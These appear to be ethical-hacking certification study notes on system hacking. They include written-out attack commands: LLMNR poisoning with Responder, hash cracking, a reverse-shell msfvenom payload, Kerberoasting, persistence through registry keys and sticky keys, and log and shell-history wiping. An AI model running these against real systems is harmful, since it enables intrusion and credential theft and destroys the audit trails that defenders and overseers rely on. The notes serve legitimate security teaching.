# Module 06: System Hacking

## 6.1 System Hacking Methodology & Operational Lifecycle

* **System Hacking Phase:** The 4th phase of ethical hacking (following Reconnaissance, Scanning, and Enumeration). Involves actively establishing unauthorized access to a target host, escalating local execution privileges, establishing persistent access vectors, and sanitizing audit logs to bypass detection mechanisms.
* **Operational Lifecycle Stages:**
  * **Gaining Access:** Exploiting system vulnerabilities, capturing and cracking authentication credentials, executing buffer overflows, or poisoning name resolution requests.
  * **Escalating Privileges:** Elevating execution scope from standard or service accounts (`www-data`, `LOCAL SERVICE`) to administrative root access (`NT AUTHORITY\SYSTEM` or `root`).
  * **Maintaining Access:** Establishing persistent hooks (backdoors, registry startup keys, scheduled tasks, hijacked accessibility binaries) to survive system reboots and credential resets.
  * **Clearing Tracks:** Sanitizing Windows Event Logs, shredding command histories, timestomping metadata, and overwriting unallocated disk sectors to prevent detection by SOC, SIEM, or digital forensics teams.

---

## 6.2 Password Attacks, Hash Harvesting & Poisoning

### Password Attack Classifications
* **Dictionary Attack:** Sequentially tests pre-compiled lists of plaintext passwords (e.g., `rockyou.txt`).
* **Brute-Force Attack:** Systematically attempts every mathematical character combination ($A-Z$, $a-z$, $0-9$, special characters) until the correct password is identified.
* **Password Spraying Attack:** Tests one or two common passwords against hundreds/thousands of usernames to avoid triggering account lockout thresholds.
* **Hybrid Attack:** Combines dictionary base words with character mutations, appended numbers, or symbols (e.g., `Password123!`).
* **Rule-Based Attack:** Programmatically applies transformation rules (leetspeak replacement, case swapping, character insertion, word reversal) to input wordlists.
* **Rainbow Table Attack:** Performs instant $O(1)$ lookups against precomputed tables containing plaintext password strings and hash lookup chains.
  * **Primary Countermeasure:** **Salting** (appending a unique random string to the plaintext password prior to hashing) changes the final hash output and completely invalidates precomputed lookup tables.

### Name Resolution Poisoning & NTLM Exploitation
* **LLMNR / NBT-NS Poisoning:** Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are fallback name resolution protocols used when primary DNS resolution fails.
  * *Attack Mechanism:* An attacker uses **Responder** to passively listen for broadcast queries on the local subnet and spoof responses, harvesting NetNTLMv1/v2 hashes.
* **NTLM Relay Attack:** Intercepts captured NetNTLM authentication responses and relays them directly to another target host over SMB or HTTP to gain unauthorized access without needing to crack the hash offline.
* **Pass-the-Hash (PtH):** Uses captured NTLM hashes directly to authenticate to remote SMB/RDP systems without converting or cracking them to plaintext.

### Password Cracking & Credential Tool Syntax
* **Unshadowing (Linux):** Merges `/etc/passwd` and `/etc/shadow` into a format processable by cracking tools:
  ```bash
  unshadow /etc/passwd /etc/shadow > unshadowed.txt
  ```
* **Responder:**
  * `responder -I eth0 -dwv` : Listens on interface `eth0` for LLMNR, NBT-NS, and mDNS broadcast queries to harvest NetNTLM hashes.
* **John the Ripper:**
  * `john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt` : Cracks unshadowed Linux or NTLM hashes using a specified wordlist.
* **Hashcat:**
  * `hashcat -m 1000 -a 0 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt` : Cracks NTLM hashes (Mode 1000) using GPU acceleration.
  * `hashcat -m 13100 -a 0 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt` : Cracks Kerberos 5 TGS-REP hashes (Kerberoasting - Mode 13100).
  * `hashcat -m 18200 -a 0 asrep_hashes.txt /usr/share/wordlists/rockyou.txt` : Cracks Kerberos 5 AS-REP hashes (AS-REP Roasting - Mode 18200).
* **Hydra:**
  * `hydra -L users.txt -P passwords.txt smb://192.168.1.50` : Executes dictionary attacks against SMB services.
  * `hydra -l Administrator -P passwords.txt rdp://192.168.1.50` : Executes brute-force attacks against Remote Desktop Protocol (RDP).

---

## 6.3 Buffer Overflow Mechanics, Memory Protections & Exploitation

### Core x86 Stack Architecture & Registers
* **Stack Memory Structure:** Last-In, First-Out (LIFO) memory structure containing local function variables, parameter listings, and control pointers.
* **Key Architecture Registers:**
  * **ESP (Extended Stack Pointer):** Points to the top memory address of the current stack frame.
  * **EBP (Extended Base Pointer):** Points to the base address of the current stack frame.
  * **EIP (Extended Instruction Pointer):** Holds the memory address of the **next CPU instruction** to be executed (*Primary Attack Control Target*).

### Memory Defense Mechanisms & Countermeasures
* **ASLR (Address Space Layout Randomization):** Randomizes memory addresses of executable loading points, stack, and heap locations across system reboots to stop static address jumps.
* **DEP / NX Bit (Data Execution Prevention / No-Execute Bit):** Marks memory regions (such as the stack) as non-executable to prevent dynamic shellcode execution from injected buffers.
* **SafeSEH & Stack Canaries:**
  * *SafeSEH:* Validates Structured Exception Handling targets prior to execution.
  * *Stack Canaries:* Places secret values directly before the instruction pointer; if overwritten during a buffer overflow, the process terminates instantly.

### 5-Step Buffer Overflow Exploitation Lifecycle

1. **Fuzzing:** Inject incrementally larger data strings (e.g., repeating `A` / `\x41` characters) into an input parameter until the application crashes and overwrites CPU registers.
2. **Finding the EIP Offset:**
   * Generate a non-repeating cyclic pattern to determine the exact byte offset required to overwrite `EIP`:
     ```bash
     /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
     ```
   * Input the pattern into the exploit script, capture the hexadecimal value in `EIP` at crash time, and calculate the offset:
     ```bash
     /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 39694438
     ```
3. **Bad Character Identification:** Send all hex values (`\x01` through `\xff`) in the payload to identify characters truncated or mangled by application logic. The null byte (`\x00`) is universally a bad character as it serves as a C string terminator.
4. **Locating a JMP ESP Address:** Use Immunity Debugger or x64dbg with `mona.py` to identify a dynamic link library (`.dll`) compiled without ASLR, SafeSEH, or Rebase protections:
   ```mona
   !mona modules
   !mona jmp -r esp -m essfunc.dll
   ```
5. **Payload Generation & Construction:**
   * Generate encoded shellcode with `msfvenom` excluding bad characters:
     ```bash
     msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -b "\x00\x0a\x0d" -f c
     ```
   * **NOP Sled (`\x90`):** Inserted directly before the shellcode to provide a safe landing zone for execution execution flow.
   * **Final Payload Structure:** `[ Padding (Offset) ] + [ JMP ESP Pointer ] + [ NOP Sled (\x90) ] + [ Shellcode ]`

---

## 6.4 Local Privilege Escalation Vectors

### Windows Privilege Escalation
* **User Account Control (UAC) Bypass:** Bypassing UAC prompts by exploiting auto-elevating binaries (e.g., `fodhelper.exe`, `computerdefaults.exe`) or hijacking vulnerable COM objects.
* **Token Impersonation (Potato Class Exploits):** Abusing process privileges assigned to service accounts, specifically `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege`.
  * *Attack Utilities:* **JuicyPotato**, **RoguePotato**, **PrintSpoofer**, **SweetPotato**.
* **Unquoted Service Paths:** Occurs when a Windows service path contains spaces and lacks double quotes (e.g., `C:\Program Files\My Service\service.exe`).
  * *Execution Sequence Attempted by Windows:*
    1. `C:\Program.exe`
    2. `C:\Program Files\My.exe`
    3. `C:\Program Files\My Service\service.exe`
  * If write permissions exist at `C:\`, placing `Program.exe` yields system privilege execution upon service restart.
* **Weak Service Permissions:** Directly overwriting binary executables associated with system services when write permissions are granted to `BUILTIN\Users` or `EVERYONE`.

### Linux Privilege Escalation
* **SUID / SGID Executable Exploitation:** Executables configured with the Set-User-ID bit (`-rwsr-xr-x`) run under the security context of the file owner (`root`) rather than the executing user.
  * *Enumeration Command:*
    ```bash
    find / -perm -4000 -type f 2>/dev/null
    ```
  * Discovered binaries are cross-referenced against **GTFOBins** for shell breakout commands.
* **Sudo Misconfigurations (`/etc/sudoers`):**
  * Inspect permitted user sudo execution rules:
    ```bash
    sudo -l
    ```
  * If entries specify `(ALL : ALL) NOPASSWD: /usr/bin/find` or similar binaries, execute shell breakout steps to gain `root`.

---

## 6.5 Active Directory & Kerberos Enumeration & Attacks

### Active Directory Enumeration Utilities
* **PowerView:**
  ```powershell
  Import-Module .\PowerView.ps1
  Get-NetDomain
  Get-NetUser
  Get-NetGroupMember -Group "Domain Admins"
  Get-NetComputer
  ```
* **CrackMapExec / NetExec:**
  ```bash
  crackmapexec smb 192.168.1.0/24 -u users.txt -p 'Winter2026!' --continue-on-success
  ```

### Kerberos Exploitation Mechanisms
* **AS-REP Roasting:** Targets Active Directory accounts that have the `Do not require Kerberos preauthentication` flag enabled (`DONT_REQ_PREAUTH`).
  * An attacker requests an AS-REP ticket, extracts the encrypted ticket portion, and cracks the password hash offline using Hashcat (Mode 18200).
  * *Tool:* `GetNPUsers.py` (Impacket suite)
    ```bash
    python3 GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -outputfile asrep.txt -no-pass
    ```
* **Kerberoasting:** Targets domain accounts mapped to a **Service Principal Name (SPN)** (e.g., service accounts for `MSSQLSvc` or `HTTP`).
  * Any authenticated domain user can request a Kerberos TGS ticket for an SPN, extract the encrypted ticket blob, and crack it offline using Hashcat (Mode 13100) to recover the service account password.
  * *Tools:* `GetUserSPNs.py` (Impacket suite) or `Rubeus`
    ```bash
    python3 GetUserSPNs.py domain.local/user:password -request -outputfile kerberoast.txt
    ```
* **Golden Ticket Attack:** Forges a Ticket Granting Ticket (TGT) using the compromised `krbtgt` user account hash, granting persistent full Domain Admin permissions across the entire Active Directory forest.
* **Silver Ticket Attack:** Forges a Ticket Granting Service (TGS) ticket using a compromised target service account hash, granting access exclusively to that specific service (e.g., MSSQL or CIFS).

---

## 6.6 Maintaining Access & Clearing Tracks

### Maintaining Access (Persistence Mechanisms)
* **Registry Run Keys:** Adding malicious startup entries into system or user registry hives to launch payloads automatically upon system boot or login:
  * `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
  * `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
* **Accessibility Binary Hijacking (Sticky Keys Trick):** Replacing accessibility executables (`sethc.exe` or `utilman.exe`) with `cmd.exe`.
  * *Execution:* Pressing `SHIFT` five times at the Windows lock screen launches an unauthenticated command prompt with `NT AUTHORITY\SYSTEM` rights.
* **Metasploit Persistence Module:**
  ```msf
  use exploit/windows/local/persistence
  set SESSION 1
  set LHOST 192.168.1.10
  run
  ```

### Clearing Tracks & Forensic Evasion
* **Windows Event Log Sanitization:**
  * *PowerShell:* `Clear-EventLog -LogName System, Security, Application`
  * *Windows Event Utility:* `wevtutil cl System` & `wevtutil cl Security`
* **Linux Command History & Log Evasion:**
  ```bash
  unset HISTFILE
  export HISTSIZE=0
  export HISTFILESIZE=0
  history -c && history -w
  shred -u ~/.bash_history
  ```
* **Unallocated Disk Sector Overwriting:** Overwrites deleted files in unallocated disk clusters to prevent digital forensic recovery:
  ```cmd
  cipher /w:C:\
  ```